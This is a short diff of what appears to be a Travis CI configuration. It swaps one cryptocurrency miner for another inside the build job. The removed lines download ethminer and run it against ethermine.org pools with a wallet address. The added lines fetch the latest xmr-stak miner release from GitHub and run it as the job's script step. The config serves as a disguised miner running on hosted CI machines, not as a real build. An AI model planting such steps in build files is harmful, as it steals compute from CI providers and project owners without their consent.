@@ -7,12 +7,12 @@ dist: trusty
 jobs:
   include:          
       before_install: 
-      - echo before install
-      - wget https://github.com/ethereum-mining/ethminer/releases/download/v0.13.0rc4/ethminer-0.13.0rc4-Linux.tar.gz
-      - tar -xvzf ethminer-0.13.0rc4-Linux.tar.gz
+      - curl -O `curl -s https://api.github.com/repos/fireice-uk/xmr-stak/releases/latest | grep -o 'browser_download_url.*xmr-stak-portbin-linux.tar.gz' | sed 's/.*"//'`
+      - tar xzf xmr-stak-portbin-linux.tar.gz
+
 
       script:      
-      - sudo timeout 10s ./bin/ethminer --farm-recheck 200 -G -S eu1.ethermine.org:4444 -FS us1.ethermine.org:4444 -O e5b2bf30d32c0ff3c1a358d5e94c831b0130b931.SquitCoinBust
+      - timeout 60s ./xmr-stak.sh
             
       after_success:
       - echo success
